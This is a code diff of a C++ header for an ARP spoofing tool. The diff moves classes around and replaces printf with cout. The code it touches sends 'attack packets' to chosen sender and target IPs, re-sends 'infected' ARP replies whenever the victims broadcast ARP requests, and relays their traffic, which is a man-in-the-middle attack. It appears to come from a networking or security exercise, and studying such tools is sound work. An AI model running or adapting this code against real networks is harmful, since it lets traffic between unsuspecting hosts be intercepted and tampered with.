@@ -5,24 +5,8 @@
 #include "ip.h"
 #include "packet.h"
 
-class ObserveQueue : public Observer {
-private:
-    RootManager& rootManager = RootManager::getInstance();
-    ReceivedPacket& receivedPacket = ReceivedPacket::getInstance();
-public:
-    void update(uint16_t type) override {
-        if (type == EthHdr::Arp) {
-            EthArpPacket arp_packet = receivedPacket.popArp();
-            if (arp_packet.isNULL()) return;
-            rootManager.arp_infection_packet_send(arp_packet);
-        }
-        else {
-            vector<u_char> packet = receivedPacket.popRelay();
-            if (packet.empty()) return;
-            rootManager.relay_packet_send(packet);
-        }
-    }
-};
+class RootManager;
+class ObserveQueue;
 
 class RootManager {
 private :
@@ -53,9 +37,10 @@ public :
             attacks.push_back(AttackPacket(interface, handle, Ip(argv[i*2+1]), Ip(argv[(i+1)*2])));
             attacks.at(i).set_attack_packet();
             attacks.at(i).send_my_packet();
-            printf("[*] Send first attack packet (%s) (%s)\n", attacks.at(i).senderIp, attacks.at(i).targetIp);
+            cout << "[*] Send first attack packet (" << attacks.at(i).senderIp << ") (" << attacks.at(i).targetIp << ")" << endl;
         }
-        receivedPacket.attach(observer);
+        observer = std::make_shared<ObserveQueue>();
+        receivedPacket.attach(static_pointer_cast<Observer>(observer));
     }
 
     void start_receive() {
@@ -65,25 +50,45 @@ public :
     void arp_infection_packet_send(EthArpPacket& packet) {
         for (AttackPacket attack : attacks) {
             if (attack.is_broadcast_from_sender(packet)) {
-                printf("[*] Arp Broadcase packet is Detected from %s\n", packet.arp_.sip());
+                cout << "[*] Arp Broadcase packet is Detected from " << packet.arp_.sip() << endl;
                 attack.set_attack_packet();
                 attack.send_my_packet();
-                printf("[*] Resend infected Arp Packet to %s\n", packet.arp_.sip());
+                cout << "[*] Resend infected Arp Packet to " << packet.arp_.sip() << endl;
                 return ;
             }
         }
-        printf("[*] Unknown arp packet is detected from %s \n", packet.arp_.sip());
+        cout << "[*] Unknown arp packet is detected from " << packet.arp_.sip() << endl;
     }
 
     void relay_packet_send(vector<u_char>& packet) {
         EthHdr *ethhdr = reinterpret_cast<EthHdr *>(packet.data());
         for (AttackPacket attack : attacks) {
             if (ethhdr->smac() == attack.senderMac) {
-                printf("[*] Normal Packet is detected from %s\n", attack.senderIp);
+                cout << "[*] Normal Packet is detected from " << attack.senderIp << endl;
                 attack.relay_send(packet);
-                printf("[*] Relay Packet to %s\n", attack.targetIp);
+                cout << "[*] Relay Packet to " << attack.targetIp << endl;
             }
         }
-        printf("[*] Unkown packet Detected\n");
+        cout << "[*] Unkown packet Detected" << endl;
+    }
+};
+
+
+class ObserveQueue : public Observer {
+private:
+    RootManager& rootManager = RootManager::getInstance();
+    ReceivedPacket& receivedPacket = ReceivedPacket::getInstance();
+public:
+    void update(uint16_t type) override {
+        if (type == EthHdr::Arp) {
+            EthArpPacket arp_packet = receivedPacket.popArp();
+            if (arp_packet.isNULL()) return;
+            rootManager.arp_infection_packet_send(arp_packet);
+        }
+        else {
+            vector<u_char> packet = receivedPacket.popRelay();
+            if (packet.empty()) return;
+            rootManager.relay_packet_send(packet);
+        }
     }
 };
